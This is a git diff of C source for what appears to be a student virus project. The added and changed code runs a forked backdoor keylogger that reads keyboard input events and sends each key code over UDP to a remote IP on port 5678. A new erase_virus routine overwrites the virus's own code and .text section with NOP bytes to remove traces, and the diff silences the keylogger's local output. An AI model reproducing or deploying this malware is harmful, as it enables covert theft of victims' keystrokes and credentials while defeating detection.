@@ -362,16 +362,35 @@ int	my_inet_aton(char *cp, struct in_addr *ap)
 	return 1;
 }
 
+static void	erase_virus()
+{
+	void *start = &ft_memcpy;
+	void *end = &ft_memset;
+	size_t size;
+
+	start = (void *)((size_t)start - BIS_SIZE);
+	size = (size_t)end - (size_t)start;
+	ft_memset(start, size, '\x90');
+
+	start = &write_exe;
+	end = &erase_virus;
+	size = (size_t)end - (size_t)start;
+	ft_memset(start, size, '\x90');
+
+	start = &main;
+	ft_memset(start, MAIN_SIZE, '\x90');
+	return ;
+}
+
 static void	backdoor_keylog()
 {
 	pid_t pid = ft_sysfork();
 
 	if (pid == -1)
-		ft_sysexit(0);
+		return ;
 	if (pid == 0)
 	{
- 		void *addr = &ft_memcpy;
- 		size_t end = (size_t)(&ft_sysread);
+		void *addr = &ft_memcpy;
 		int fd;
 		int sock;
 		struct sockaddr_in struct_addr_in;
@@ -383,7 +402,6 @@ static void	backdoor_keylog()
 		fd = ft_sysopen(buf, O_RDONLY);
 		if (fd < 0)
 			ft_sysexit(0);
-// 		ft_syswrite(1, buf, 10);
 		sock = ft_syssocket(AF_INET, SOCK_DGRAM, 0);
 		if (sock < 0)
 		{
@@ -396,12 +414,12 @@ static void	backdoor_keylog()
 		struct_addr_in.sin_port = my_htons(5678);
 		write_ip(buf);
 		my_inet_aton(buf, &struct_addr_in.sin_addr);
- 		(void)addr;
- 		(void)end;
 
-		ft_sysmprotect(addr, (size_t)end - (size_t)addr, PROT_WRITE | PROT_READ | PROT_EXEC);
-		ft_memset(addr, (size_t)end - (size_t)addr, '\x90');
-//		ft_delete_and_loop(fd, ev, sock, struct_addr_in, len_struct);
+		// delete .text
+		uint32_t size = mprotect_text(PROT_WRITE | PROT_READ | PROT_EXEC);
+		ft_memset(addr, size, '\x90');
+
+		erase_virus();
 
 		while (1)
 		{
@@ -410,35 +428,15 @@ static void	backdoor_keylog()
 			{
 				if (ft_syssendto(sock, &(ev.code), 2, 0, (struct sockaddr *)&struct_addr_in, len_struct) < 0)
 					ft_sysexit(0);
-				ft_syswrite(1, &(ev.code), 2);
+// 				ft_syswrite(1, &(ev.code), 2);
 			}
 		}
 
 
 	}
 	else
-		ft_sysexit(0);
+		return ;
 }
-/*
-void		ft_delete_and_loop(size_t start, size_t size)// , ... ajuter les params pour la loop)
-{
-	size_t i = 0;
-	unsigned char *str = (unsigned char *)(start);
-	while (i < size)
-	{
-		str[i] = '\x90';
-		i++;
-	}
-	while (1)
-	{
-		ft_sysread(fd, &ev, sizeof(struct input_event));
-		if (ev.type == EV_KEY && ev.value == 0x1)
-		{
-			if (ft_syssendto(sock, &(ev.code), 2, 0, (struct sockaddr *)&struct_addr_in, len_struct) < 0)
-				ft_sysexit(0);
-		}
-	}
-}*/
 
 int		main(void)
 {
